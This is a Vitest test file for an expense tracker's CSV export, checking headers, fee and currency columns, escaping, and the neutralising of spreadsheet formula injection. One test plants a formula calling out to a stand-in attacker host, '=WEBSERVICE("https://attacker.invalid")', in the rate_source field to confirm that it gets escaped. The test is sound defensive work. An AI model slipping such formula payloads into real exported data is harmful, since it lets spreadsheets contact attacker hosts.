// CSV export format tests. Pure data, no DOM.

import { describe, it, expect } from "vitest";
import { entriesToCsv } from "./csvExport";
import type { EntryPayload } from "./types";

const sampleRow: EntryPayload = {
  ts: Date.UTC(2026, 5, 12, 14, 30),
  kind: "expense",
  currency: "USD",
  amount_minor: 1250,
  direction: "debt",
  note: "lunch",
};

describe("csvExport", () => {
  it("renders the header", () => {
    const csv = entriesToCsv([
      { payload: sampleRow, created_by_me: true, edited: false },
    ]);
    const first = csv.split("\n")[0];
    expect(first).toBe(
      "date,kind,txn_type,currency,amount,gross_amount,fee_percent,fee_fixed," +
        "direction,due_dates,note," +
        "convert_from_currency,convert_from_amount,convert_rate," +
        "convert_source,created_by,edited",
    );
  });

  it("emits ISO date, net amount, txn_type and plain-language direction", () => {
    const csv = entriesToCsv([
      { payload: sampleRow, created_by_me: true, edited: false },
    ]);
    // date,kind,txn_type,currency,amount,gross,fee%,feeFixed,direction,due_dates,note
    expect(csv).toContain(
      "2026-06-12,expense,iou,USD,12.50,,,,You owe,2026-06-12:100%,lunch",
    );
  });

  it("renders a fee row: net amount + gross + fee% + fixed fee", () => {
    const csv = entriesToCsv([
      {
        payload: {
          ...sampleRow,
          direction: "credit",
          txn_type: "iou",
          amount_minor: 75000, // net = 1000 − 20% − 50.00 fixed
          fee: { percent: 20, fixed_minor: 5000, gross_amount_minor: 100000 },
        },
        created_by_me: true,
        edited: false,
      },
    ]);
    const line = csv.split("\n").find((l) => l.startsWith("2026-06-12"))!;
    // amount(net)=750.00, gross=1000.00, fee%=20, fee_fixed=50.00, Owed to you
    expect(line).toContain("iou,USD,750.00,1000.00,20,50.00,Owed to you,");
  });

  it.each([
    ["credit", true, "Owed to you"], ["credit", false, "You owe"],
    ["debt", true, "You owe"], ["debt", false, "Owed to you"],
  ] as const)("orients exported direction to the viewer without mutating %s (%s)", (direction, mine, label) => {
    const payload = { ...sampleRow, direction };
    const before = JSON.stringify(payload);
    const cells = entriesToCsv([{ payload, created_by_me: mine, edited: false }]).split("\n")[1].split(",");
    expect(cells[8]).toBe(label);
    expect(cells[4]).toBe("12.50");
    expect(JSON.stringify(payload)).toBe(before);
  });

  it("escapes commas, quotes, and newlines", () => {
    const csv = entriesToCsv([
      {
        payload: {
          ...sampleRow,
          note: 'comma, "quote", and\nnewline',
        },
        created_by_me: false,
        edited: false,
      },
    ]);
    // The note cell should be quoted; internal " doubled; embedded
    // \n kept inside the quotes.
    expect(csv).toContain(
      '"comma, ""quote"", and\nnewline"',
    );
  });

  it("renders the convert sub-payload", () => {
    const csv = entriesToCsv([
      {
        payload: {
          ...sampleRow,
          currency: "EGP",
          amount_minor: 61400,
          convert: {
            from_currency: "USD",
            from_amount_minor: 1250,
            to_currency: "EGP",
            to_amount_minor: 61400,
            rate: 49.12,
            rate_source: "frankfurter.app",
            rate_fetched_at: Date.now(),
          },
        },
        created_by_me: true,
        edited: true,
      },
    ]);
    const line = csv.split("\n").find((l) => l.startsWith("2026-06-12"));
    expect(line).toContain("EGP");
    expect(line).toContain("USD");
    expect(line).toContain("49.12");
    expect(line).toContain("frankfurter.app");
    expect(line!.endsWith("you,true")).toBe(true);
  });

  it.each(["=1+1", "+SUM(A1:A2)", "-2+3", "@SUM(A1:A2)"])(
    "neutralizes spreadsheet formula note %j",
    (note) => {
      const csv = entriesToCsv([
        { payload: { ...sampleRow, note }, created_by_me: true, edited: false },
      ]);
      expect(csv.split("\n")[1].split(",")[10]).toBe(`'${note}`);
    },
  );

  it.each(["  =1+1", "\t=1+1", "\r=1+1", "\ufeff@SUM(A1:A2)"])(
    "neutralizes formula prefixes hidden behind whitespace %j",
    (note) => {
      const csv = entriesToCsv([
        { payload: { ...sampleRow, note }, created_by_me: true, edited: false },
      ]);
      expect(csv).toContain(`'${note}`);
    },
  );

  it("does not alter benign arithmetic characters in the middle of text", () => {
    const csv = entriesToCsv([
      {
        payload: { ...sampleRow, note: "rent = 100 + utilities" },
        created_by_me: true,
        edited: false,
      },
    ]);
    expect(csv).toContain("rent = 100 + utilities");
    expect(csv).not.toContain("'rent = 100 + utilities");
  });

  it("neutralizes formula text in a non-note user-controlled column", () => {
    const csv = entriesToCsv([
      {
        payload: {
          ...sampleRow,
          convert: {
            from_currency: "EUR",
            from_amount_minor: 1000,
            to_currency: "USD",
            to_amount_minor: 1250,
            rate: 1.25,
            rate_source: "=WEBSERVICE(\"https://attacker.invalid\")",
            rate_fetched_at: sampleRow.ts,
          },
        },
        created_by_me: true,
        edited: false,
      },
    ]);
    expect(csv).toContain("'=WEBSERVICE");
    expect(csv).not.toContain(",=WEBSERVICE");
  });

  it("writes empty cells for non-fee, non-convert rows", () => {
    const csv = entriesToCsv([
      { payload: sampleRow, created_by_me: false, edited: false },
    ]);
    const line = csv.split("\n")[1];
    const cells = line.split(",");
    expect(cells[5]).toBe(""); // gross_amount
    expect(cells[6]).toBe(""); // fee_percent
    expect(cells[7]).toBe(""); // fee_fixed
    // convert_from_currency, convert_from_amount, convert_rate, convert_source
    expect(cells[11]).toBe("");
    expect(cells[12]).toBe("");
    expect(cells[13]).toBe("");
    expect(cells[14]).toBe("");
    expect(cells[15]).toBe("them");
    expect(cells[16]).toBe("false");
  });
});
